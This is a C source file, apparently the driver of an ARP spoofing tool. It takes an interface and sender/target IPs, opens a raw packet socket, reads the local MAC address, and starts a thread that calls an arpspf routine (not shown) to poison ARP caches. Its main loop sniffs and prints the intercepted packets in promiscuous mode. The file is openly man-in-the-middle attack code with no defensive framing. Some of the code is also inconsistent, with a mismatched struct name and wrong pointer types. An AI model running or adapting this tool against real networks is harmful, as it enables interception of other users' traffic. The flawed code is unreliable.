#include "arp-spoof.h"

char *interfaceName;

void *prearpspf(arp_info *arpInfo)    {
    struct sockaddr_ll sk_addr;
    memset(&sk_addr, 0, sizeof(struct sockaddr_ll));

    int sockfd = -1;
    if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0){
        perror("socket function failed");
    }

    struct ifreq if_hwaddr;
    memset(&if_hwaddr,0,sizeof(struct ifreq));
    strncpy(if_hwaddr.ifr_name, interfaceName, IFNAMSIZ-1);
    ioctl(sockfd, SIOCGIFHWADDR, &if_hwaddr);

    arpspf(if_hwaddr.ifr_hwaddr.sa_data, arpInfo -> header, arpInfo -> handle, &(arpInfo -> sender), &(arpInfo -> target));
}

int main(int argc, char const *argv[]) {

    pcap_t *handle;		
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;	
    struct pcap_pkthdr header;	
    bpf_u_int32 mask;
    bpf_u_int32 net;

    u_char packet[100];

    if(argc < 4)   {
        printf("\n\nUsage : %s [interface] [sender1] [target1] ... \n\n", argv[0]);
        return 0;
    }

    struct in_addr iaddr;

    const char* dev = argv[1];

    struct sockaddr_in sender;
    struct sockaddr_in target;

    inet_pton(AF_INET, argv[2], &(sender.sin_addr));
    inet_pton(AF_INET, argv[3], &(target.sin_addr));

    pcap_lookupnet(dev, &net, &mask, errbuf);
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    struct arpInfo arpInfo;
    arpInfo.header = header;
    arpInfo.handle = handle;
    arpInfo.sender = sender;
    arpInfo.target = target;


    interfaceName = argv[1];
    pthread_t tid;
    pthread_create(&tid, NULL, prearpspf, &arpInfo);

    int chk = 0;
    char *packet2;

    while(1) {
    	chk = pcap_next_ex(handle, &header, &packet2);
		if(chk != 1 ) continue;
        print_packet(packet2, 60);
    }

    return 0;
}

